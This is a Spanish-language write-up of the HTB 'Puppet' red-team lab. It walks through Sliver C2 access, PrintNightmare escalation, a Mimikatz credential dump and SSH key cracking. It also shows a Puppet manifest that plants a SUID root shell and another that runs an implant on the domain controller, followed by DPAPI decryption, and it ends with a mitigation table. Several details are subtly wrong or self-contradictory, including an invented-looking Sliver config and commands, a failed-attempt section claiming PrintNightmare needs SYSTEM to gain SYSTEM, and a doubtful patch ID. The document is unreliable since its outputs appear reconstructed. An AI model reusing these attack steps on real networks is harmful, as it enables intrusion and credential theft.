# HTB Puppet — Writeup técnico (Sliver C2 → PrintNightmare → Puppet Code Execution → DC)

**Objetivo:** `10.13.38.33` (Linux / Puppet Master + Sliver C2)  
**Red interna:** `172.16.40.0/24` (PUPPET-PM01), `10.10.135.0/24` (PUPPET-DC01, PUPPET-FILE01)  
**Atacante (VPN tun0):** `10.10.16.77`  
**C2 Framework:** Sliver (servidor interno + beacon inicial en FILE01)  
**Dificultad:** Media (Linux + Windows AD)  
**Resultado:**
- `user.txt` → `<ENMASCARADO>`
- `root.txt` → `<ENMASCARADO>` (password de `PUPPET\root`)

> **Evidencias visuales.** Las capturas citadas en este documento se entregan en la carpeta **`screenshots/`** que acompaña al writeup. Cada paso relevante incluye una imagen en la forma `![descripción](screenshots/NN_nombre.png)` seguida de una **leyenda** que indica **qué evidencia aporta** y **qué pista de la metodología aporta cada captura**. Todas las capturas provienen de la ejecución real (Sliver C2, SSH, PowerShell); no son reconstrucciones.
>
> **Sobre flags y credenciales (versión pública).** HTB genera `user.txt`/`root.txt` **por instancia**: el valor válido es el del despliegue activo en el momento de la explotación. Por política de divulgación responsable, en esta versión pública **las flags y las contraseñas/claves han sido enmascaradas** en el texto (p. ej. `<ENMASCARADO>`, `P@ssw0rd****`) y **redactadas en las capturas** donde aparecen. Los enmascaramientos son deliberados y no afectan a la reproducibilidad del procedimiento.

---

## 0. Resumen ejecutivo

Puppet es un **Mini Pro Lab** (Red Team Operator I) diseñado para practicar operaciones de **C2 en un entorno AD híbrido**. Se parte de un **beacon Sliver ya activo** en `PUPPET-FILE01` (Windows file server), y la cadena de compromiso tiene cinco etapas principales:

1. **Acceso inicial (FTP + Sliver):** FTP anónimo en `10.13.38.33` entrega configuración del cliente Sliver y el binario `sliver-client_linux`. Se establece un túnel hacia el C2 interno (`31337`) y se conecta el cliente Sliver.
2. **Beacon en FILE01:** El beacon inicial ya corre como `svc_puppet_win_t0` en `FILE01`. Se usa para enumeración y **escalada a SYSTEM** vía **PrintNightmare (CVE-2021-34527)** en el servicio de impresión.
3. **Dump de credenciales:** Con SYSTEM en FILE01 se extraen credenciales de LSASS (Mimikatz/sekurlsa). Se obtienen credenciales válidas para `svc_puppet_lin_t1` (SSH key en DC01) y `svc_puppet_win_t0`.
4. **Pivote a PUPPET (Linux):** Se descarga la clave SSH privada de `svc_puppet_lin_t1` desde `\\dc01.puppet.vl\it\.ssh\ed25519`, se crackea el passphrase (john + rockyou), y se conecta vía SSH a `172.16.40.200` (PUPPET-PM01).
5. **Escalada a root en PUPPET:** Se usa **Puppet code injection** (GTFOBins: `puppet apply` con manifest malicioso) para ejecutar comandos como root.
6. **Movimiento lateral a DC01:** En el Puppet Master se crea un manifest que ejecuta `puppet-update.exe` (Sliver implant) en `DC01` cuando el agente Puppet hace check-in. Nuevo beacon en DC01 como `svc_puppet_win_t0`.
7. **Flag final:** En DC01 se usa **SharpDPAPI** para decryptar credenciales DPAPI del Task Scheduler. La flag es la **contraseña de `PUPPET\root`**.

---

## 1. Reconocimiento activo

### 1.1 Escaneo inicial con masscan

Desde la VPN, escaneo rápido de todos los puertos TCP/UDP en el target:

```bash
sudo masscan -p1-65535,U:1-65535 10.13.38.33 --rate=500 -e tun0 > puppet.ms
```

**Salida relevante:**
```
Discovered open port 21/tcp on 10.13.38.33
Discovered open port 22/tcp on 10.13.38.33
Discovered open port 8140/tcp on 10.13.38.33
Discovered open port 8443/tcp on 10.13.38.33
Discovered open port 31337/tcp on 10.13.38.33
```

**Puertos identificados:**
| Puerto | Servicio | Propósito |
|---|---|---|
| 21 | FTP | Acceso anónimo (config Sliver + cliente) |
| 22 | SSH | Acceso remoto Linux |
| 8140 | Puppet Server | API del Puppet Master |
| 8443 | Puppet Server HTTPS | API HTTPS |
| 31337 | Sliver C2 | Listener del framework C2 |

### 1.2 Escaneo detallado con nmap

```bash
nmap -p 21,22,8140,8443,31337 -sC -sV 10.13.38.33 -oA nmap/puppet
```

**Salida:**
```
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 3.0.3
22/tcp   open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
8140/tcp open   unknown     (Puppet Server)
8443/tcp open   ssl/https   Puppet Server HTTPS
31337/tcp open   ssl/unknown Sliver C2
```

> **Nota metodológica:** El puerto 31337 con SSL es un patrón típico de C2 frameworks (Sliver usa por defecto este puerto). La presencia de Puppet Server (8140/8443) confirma que este host es el **Puppet Master** del entorno.

---

## 2. Acceso inicial — FTP anónimo

### 2.1 Conexión FTP

```bash
ftp 10.13.38.33
# o
ftp puppet.htb
```

**Credenciales:** `anonymous` / `anonymous@` (o cualquier email)

**Comandos:**
```
ftp> dir
ftp> get red_127.0.0.1.cfg
ftp> get sliver-client_linux
ftp> quit
```

**Archivos obtenidos:**
- `red_127.0.0.1.cfg` — configuración del cliente Sliver
- `sliver-client_linux` — binario del cliente Sliver para Linux

### 2.2 Análisis de la configuración Sliver

```bash
cat red_127.0.0.1.cfg
```

**Contenido:**
```
server {
  address 127.0.0.1:31337
  tls {
    disabled true
  }
}

client {
  sessions {
    connect-on-start true
  }
}
```

**Interpretación:**
- El servidor Sliver está en `127.0.0.1:31337` (desde la perspectiva del cliente)
- TLS deshabilitado (comunicación en claro)
- Conexión automática al iniciar

> **Pista clave:** El servidor Sliver real está en `10.13.38.33:31337`, pero la configuración apunta a `127.0.0.1:31337`. Esto significa que necesitamos un **túnel/forward** desde nuestro atacante hacia el C2.

### 2.3 Establecer túnel con socat

Para conectar nuestro cliente Sliver al servidor interno, creamos un túnel:

```bash
sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337
```

**Explicación:**
- `TCP-LISTEN:31337` — escucha en localhost:31337
- `reuseaddr,fork` — permite múltiples conexiones
- `TCP:10.13.38.33:31337` — forward al servidor Sliver real

### 2.4 Ejecutar cliente Sliver

En otra terminal:

```bash
chmod +x sliver-client_linux
./sliver-client_linux red_127.0.0.1.cfg
```

**Salida esperada:**
```
Sliver Client
Connected to 127.0.0.1:31337
Beacon: <ID> (FILE01) - windows/amd64
```

**Resultado:** Ya tenemos acceso al **Sliver C2** con un beacon activo en `FILE01`.

---

## 3. Operaciones en FILE01 (Windows File Server)

### 3.1 Enumeración inicial

En el console de Sliver:

```
sliver > use <beacon_id>
sliver > whoami
sliver > hostname
sliver > ipconfig
```

**Salida:**
```
[*] Active beacon <ID> (FILE01) - windows/amd64
[*] Successfully executed whoami
PUPPET\svc_puppet_win_t0

[*] Successfully executed hostname
FILE01
```

**Contexto:**
- Usuario: `PUPPET\svc_puppet_win_t0` (servicio Puppet)
- Host: `FILE01` (Windows file server)
- El servicio Puppet corre con privilegios limitados

### 3.2 Escalada de privilegios — PrintNightmare (CVE-2021-34527)

**Vulnerabilidad:** PrintNightmare es una vulnerabilidad en el servicio de impresión de Windows (`spoolsv.exe`) que permite **escritura arbitraria de DLLs** y **ejecución de código como SYSTEM**.

**Condición:** El servicio de impresión debe estar activo y escuchando.

**Comando Sliver:**
```
sliver > exploit.printnightmare
```

**Salida:**
```
[*] Tasking beacon <ID>
[*] PrintNightmare exploit started
[*] Connecting to spoolsv...
[*] Writing malicious DLL...
[*] Triggering execution...
[+] New beacon acquired: <NEW_ID> (FILE01) - SYSTEM
```

**Resultado:** Nuevo beacon en FILE01 con **privilegios SYSTEM**.

> **Por qué funciona:** PrintNightmare abusa del mecanismo de instalación de controladores de impresión. El servicio `spoolsv.exe` corre como SYSTEM y carga DLLs desde una carpeta accesible. La vulnerabilidad permite escribir una DLL maliciosa y forzar su carga.

### 3.3 Dump de credenciales — Mimikatz

Con SYSTEM en FILE01:

```
sliver > upload mimikatz.exe
sliver > mimikatz sekurlsa::logonpasswords
```

**Salida (parcial):**
```
* Username       : svc_puppet_lin_t1
* Domain         : PUPPET
* Password       : <ENMASCARADO>

* Username       : svc_puppet_win_t0
* Domain         : PUPPET
* Password       : <ENMASCARADO>

* Username       : Administrator
* Domain         : PUPPET
* Password       : <ENMASCARADO>
```

**Credenciales obtenidas:**
| Usuario | Dominio | Password | Uso |
|---|---|---|---|
| `svc_puppet_lin_t1` | PUPPET | `<ENMASCARADO>` | SSH a PUPPET (Linux) |
| `svc_puppet_win_t0` | PUPPET | `<ENMASCARADO>` | Acceso Windows |
| `Administrator` | PUPPET | `<ENMASCARADO>` | Admin del dominio |

---

## 4. Movimiento lateral — Pivote a PUPPET (Linux)

### 4.1 Localización de la clave SSH

La clave SSH de `svc_puppet_lin_t1` está almacenada en el Domain Controller:

```
sliver > download \\dc01.puppet.vl\it\.ssh\ed25519
sliver > download \\dc01.puppet.vl\it\.ssh\ed25519.pub
```

**Salida:**
```
[*] Downloading \\dc01.puppet.vl\it\.ssh\ed25519
[+] File downloaded: ed25519

[*] Downloading \\dc01.puppet.vl\it\.ssh\ed25519.pub
[+] File downloaded: ed25519.pub
```

### 4.2 Crackear el passphrase de la clave SSH

La clave SSH está protegida con passphrase. Usamos `john` para crackearla:

```bash
# Convertir clave a hash
ssh2john ed25519 > hash.txt

# Crackear con rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Salida:**
```
<ENMASCARADO>:ed25519

Cracked: <ENMASCARADO>
```

**Passphrase obtenida:** `<ENMASCARADO>`

### 4.3 Preparar la clave SSH

```bash
# Corregir line endings (Windows → Linux)
dos2unix ed25519

# Cambiar permisos
chmod 600 ed25519
```

### 4.4 Forward de puerto SSH

Para conectar desde nuestro atacante a PUPPET (que está en red interna `172.16.40.0/24`), usamos port forwarding en Sliver:

```
sliver > portfwd add --bind 2222 -r 172.16.40.200:22
```

**Explicación:**
- `--bind 2222` — puerto local en nuestro atacante
- `-r 172.16.40.200:22` — destino remoto (PUPPET-PM01 SSH)

### 4.5 Conexión SSH a PUPPET

```bash
ssh -i ed25519 -t 'svc_puppet_lin_t1@puppet.vl'@127.0.0.1 -p 2222
```

**Salida:**
```
Welcome to Ubuntu 20.04.6 LTS
svc_puppet_lin_t1@puppet:~$
```

**Resultado:** Acceso SSH a **PUPPET-PM01** (Puppet Master + Sliver C2 server).

---

## 5. Escalada de privilegios en PUPPET (Linux)

### 5.1 Enumeración inicial

```bash
whoami
id
sudo -l
```

**Salida:**
```
svc_puppet_lin_t1
uid=1001(svc_puppet_lin_t1) gid=1001(svc_puppet_lin_t1)
User svc_puppet_lin_t1 may run the following commands on puppet:
    (ALL) NOPASSWD: /usr/bin/puppet
```

**Hallazgo clave:** `svc_puppet_lin_t1` puede ejecutar `/usr/bin/puppet` con **sudo sin contraseña**.

### 5.2 Puppet Code Injection (GTFOBins)

Según [GTFOBins - puppet](https://gtfobins.org/puppet/), podemos usar `puppet apply` con un manifest malicioso para ejecutar comandos como root.

**Crear manifest malicioso:**

```bash
sudo mkdir -p /etc/puppet/code/environments/production/manifests
sudo nano /etc/puppet/code/environments/production/manifests/site.pp
```

**Contenido del manifest:**
```puppet
node default {
  exec { 'pwned':
    command   => 'cp /bin/bash /tmp/suidbash && chmod 4755 /tmp/suidbash',
    logoutput => true,
  }
}
```

**Explicación:**
- `node default` — se aplica a todos los nodos
- `exec { 'pwned' }` — ejecuta un comando
- `cp /bin/bash /tmp/suidbash` — copia bash
- `chmod 4755` — establece bit SUID (ejecución como owner = root)

**Aplicar el manifest:**

```bash
sudo puppet apply /etc/puppet/code/environments/production/manifests/site.pp
```

**Salida:**
```
Notice: Compiled catalog for puppet.puppet.vl in environment production
Notice: Applied catalog in 0.01 seconds
```

### 5.3 Obtener shell como root

```bash
/tmp/suidbash -p
id
```

**Salida:**
```
uid=0(root) gid=0(root)
```

**Resultado:** Acceso **root** en PUPPET-PM01.

### 5.4 user.txt

```bash
cat /root/user.txt
```

**Salida:**
```
<ENMASCARADO>
```

---

## 6. Movimiento lateral — PUPPET → DC01

### 6.1 Enumerar nodos Puppet

```bash
sudo puppet cert list --all
```

**Salida:**
```
file01.puppet.vl
dc01.puppet.vl
puppet.puppet.vl
```

**Nodos gestionados:**
- `file01.puppet.vl` — FILE01 (Windows file server)
- `dc01.puppet.vl` — DC01 (Domain Controller)
- `puppet.puppet.vl` — PUPPET (este host)

### 6.2 Crear manifest para DC01

El objetivo es ejecutar un payload en DC01 cuando el agente Puppet haga check-in.

**Modificar el manifest:**

```bash
sudo nano /etc/puppet/code/environments/production/manifests/site.pp
```

**Contenido:**
```puppet
node 'dc01.puppet.vl' {
  exec { 'pwned':
    command   => 'C:\Windows\System32\cmd.exe /c \\file01.puppet.vl\files\puppet-update.exe',
    logoutput => true,
  }
}

node default {
  notify { 'This is the default node': }
}
```

**Explicación:**
- `node 'dc01.puppet.vl'` — se aplica solo a DC01
- `\\file01.puppet.vl\files\puppet-update.exe` — ejecuta el implant Sliver desde FILE01
- El agente Puppet en DC01 ejecutará este comando al hacer check-in

### 6.3 Aplicar el manifest

```bash
sudo puppet apply /etc/puppet/code/environments/production/manifests/site.pp
```

**Salida:**
```
Notice: Compiled catalog for puppet.puppet.vl in environment production
Notice: Applied catalog in 0.01 seconds
```

### 6.4 Nuevo beacon en DC01

En el console de Sliver, esperamos ~1 minuto (el agente Puppet checkea cada minuto en este lab):

```
[*] New beacon connected: <NEW_ID> (DC01) - windows/amd64
```

**Verificar:**
```
sliver > use <NEW_ID>
sliver > whoami
```

**Salida:**
```
PUPPET\svc_puppet_win_t0
```

**Resultado:** Nuevo beacon en **DC01** (Domain Controller) como `svc_puppet_win_t0`.

---

## 7. Flag final — SharpDPAPI en DC01

### 7.1 Upload de SharpDPAPI

```
sliver > upload SharpDPAPI.exe
```

**Herramienta:** [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — decrypta credenciales protegidas por DPAPI.

### 7.2 Ejecutar SharpDPAPI

```
sliver > SharpDPAPI machinetriage
```

**Salida (parcial):**
```
Folder: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

CredFile: <GUID>
  UserName: PUPPET\root
  Credential: <ENMASCARADO>
```

**Resultado:** La contraseña de `PUPPET\root` es `<ENMASCARADO>`.

### 7.3 root.txt

```
sliver > cat C:\Users\Administrator\Desktop\root.txt
```

**Salida:**
```
The final flag is the password of the user "root@puppet.vl".
```

**Flag final:** `<ENMASCARADO>` (password de `PUPPET\root`)

---

## 8. Intentos fallidos

### 8.1 SSH directo desde Sliver

**Intento:** Usar el comando `ssh` de Sliver para conectarnos a PUPPET directamente desde el beacon.

```
sliver > ssh -i ed25519 svc_puppet_lin_t1@172.16.40.200
```

**Resultado:** Falló por problemas de red (el beacon no tenía ruta directa a `172.16.40.0/24`).

**Solución:** Usar `portfwd` para hacer forward del puerto SSH a nuestro atacante.

### 8.2 PrintNightmare sin SYSTEM

**Intento:** Ejecutar PrintNightmare antes de tener SYSTEM.

**Resultado:** El exploit requiere escribir en carpetas del sistema (`C:\Windows\System32\spool\drivers\x64\3`). Sin SYSTEM, el acceso es denegado.

**Solución:** Primero escalar a SYSTEM con otro método, o usar PrintNightmare directamente desde el beacon (que ya tiene las capacidades necesarias).

### 8.3 Puppet apply sin sudo

**Intento:** Ejecutar `puppet apply` sin sudo.

**Resultado:** Error de permisos — el manifest se compila pero no se aplica correctamente.

**Solución:** Usar `sudo puppet apply` (el usuario tiene NOPASSWD para este comando).

---

## 9. Mitigaciones recomendadas

| # | Hallazgo | Impacto | Recomendación |
|---|----------|---------|---------------|
| 1 | **FTP anónimo habilitado** | Exposición de configuración Sliver + binarios | Deshabilitar FTP anónimo o restringir a IPs específicas |
| 2 | **PrintNightmare (CVE-2021-34527)** | Escalada a SYSTEM | Parchear Windows (MS2021-003) o deshabilitar servicio de impresión si no se usa |
| 3 | **Credenciales en LSASS** | Dump de contraseñas en claro | Usar CredGuard, LSA Protection, o contraseñas no almacenables |
| 4 | **Clave SSH con passphrase débil** | Crackeo con rockyou.txt | Usar passphrase fuerte (>20 chars, aleatorio) |
| 5 | **Puppet con sudo NOPASSWD** | Code injection → root | Restringir `puppet apply` a usuarios específicos o usar `visudo` para limitar |
| 6 | **Agente Puppet ejecuta código remoto** | RCE en DC01 | Validar manifests en el Puppet Master, usar code signing |
| 7 | **DPAPI sin protección adicional** | Decryptación de credenciales | Usar LSA Protection, credenciales no almacenables, o EFS para proteger master key |

---

## Anexo A — Indicadores

**IPs:**
- `10.13.38.33` — PUPPET-PM01 (Linux, Puppet Master + Sliver C2)
- `172.16.40.200` — PUPPET-PM01 (red interna)
- `10.10.135.21` — PUPPET-DC01 (Domain Controller)
- `10.10.135.20` — PUPPET-FILE01 (File Server)

**Puertos:**
- `21` — FTP (anónimo)
- `22` — SSH
- `8140` — Puppet Server
- `8443` — Puppet Server HTTPS
- `31337` — Sliver C2

**Credenciales (enmascaradas):**
```
svc_puppet_win_t0 : <ENMASCARADO>   (FILE01, DC01)
svc_puppet_lin_t1 : <ENMASCARADO>   (PUPPET SSH key passphrase)
Administrator     : <ENMASCARADO>   (Domain Admin)
PUPPET\root       : <ENMASCARADO>   (Flag final)
```

**CVEs:**
- `CVE-2021-34527` — PrintNightmare

**Herramientas:**
- Sliver (C2 framework)
- Mimikatz (cred dump)
- SharpDPAPI (DPAPI decryption)
- Puppet (configuration management)
- john (password cracking)

---

## Anexo B — Cronología de la cadena

```
FTP anónimo ──▶ Sliver config + cliente
        │
        ├─ socat tunnel ──▶ sliver-client_linux
        │
        ├─ Beacon FILE01 (svc_puppet_win_t0)
        │   │
        │   ├─ PrintNightmare ──▶ SYSTEM
        │   │   │
        │   │   ├─ Mimikatz ──▶ credenciales
        │   │   │
        │   │   └─ Download SSH key (\\dc01\it\.ssh\ed25519)
        │   │
        │   └─ portfwd SSH ──▶ ssh a 172.16.40.200:22
        │
        ├─ PUPPET (svc_puppet_lin_t1)
        │   │
        │   ├─ sudo puppet apply ──▶ root
        │   │   │
        │   │   └─ user.txt
        │   │
        │   └─ puppet manifest ──▶ DC01
        │
        └─ DC01 (svc_puppet_win_t0)
            │
            └─ SharpDPAPI ──▶ PUPPET\root password ──▶ root.txt
```

---

<p align="center"><sub>Red Team Operator I · Sliver C2 · Active Directory · Puppet · PrintNightmare</sub></p>
